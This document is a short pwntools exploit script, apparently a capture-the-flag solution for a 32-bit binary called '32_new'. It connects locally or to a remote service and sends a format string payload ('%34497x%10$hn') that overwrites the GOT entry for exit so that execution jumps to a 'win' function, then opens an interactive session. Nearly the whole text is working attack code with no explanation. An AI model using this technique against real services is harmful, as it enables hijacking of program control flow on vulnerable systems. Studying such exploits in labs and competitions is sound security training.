#!/usr/bin/env python3

from pwn import *

exe = ELF("./32_new")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("addr", 1337)


def main():
    r = conn()	

    #gdb.attach(r, gdbscript = 'b *0x080487d7') # break at printf	
    win_function = 0x0804870b
    exit_got = 0x0804a034

    r.sendline(p32(exit_got) + "%34497x" + "%10$hn")
    r.interactive()


if __name__ == "__main__":
    main()